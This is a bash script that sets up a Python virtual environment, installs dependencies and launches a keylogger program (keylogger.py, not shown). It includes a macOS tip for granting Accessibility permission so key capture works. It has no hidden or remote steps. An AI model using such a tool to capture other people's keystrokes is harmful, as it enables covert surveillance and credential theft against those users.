#!/bin/bash
# ─────────────────────────────────────────────
#  Keylogger — setup & launch script
#  Works on Linux and macOS (bash required)
# ─────────────────────────────────────────────

set -e  # Exit immediately on any error

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VENV_DIR="$SCRIPT_DIR/.venv"

# ── 1. Check Python 3 ────────────────────────
if ! command -v python3 &>/dev/null; then
    echo "[ERROR] Python 3 is not installed."
    echo "  → On Debian/Ubuntu: sudo apt install python3 python3-venv python3-pip"
    echo "  → On macOS:         brew install python"
    exit 1
fi

PYTHON_VERSION=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
echo "[✓] Python $PYTHON_VERSION found"

# ── 2. Create virtual environment (if needed) ─
if [ ! -d "$VENV_DIR" ]; then
    echo "[*] Creating virtual environment..."
    python3 -m venv "$VENV_DIR"
    echo "[✓] Virtual environment created at $VENV_DIR"
else
    echo "[✓] Virtual environment already exists"
fi

# ── 3. Activate virtual environment ──────────
# shellcheck disable=SC1091
source "$VENV_DIR/bin/activate"

# ── 4. Install / update dependencies ─────────
echo "[*] Installing dependencies from requirements.txt..."
pip install --quiet --upgrade pip
pip install --quiet -r "$SCRIPT_DIR/requirements.txt"
echo "[✓] Dependencies installed"

# ── 5. macOS accessibility permission hint ───
if [[ "$OSTYPE" == "darwin"* ]]; then
    echo ""
    echo "[!] macOS detected."
    echo "    If the keylogger doesn't capture keys, grant Accessibility access:"
    echo "    System Settings → Privacy & Security → Accessibility → add Terminal (or your app)"
    echo ""
fi

# ── 6. Run the keylogger ──────────────────────
echo "[*] Starting keylogger..."
echo ""
python3 "$SCRIPT_DIR/keylogger.py"

# Deactivate venv when done
deactivate 2>/dev/null || true
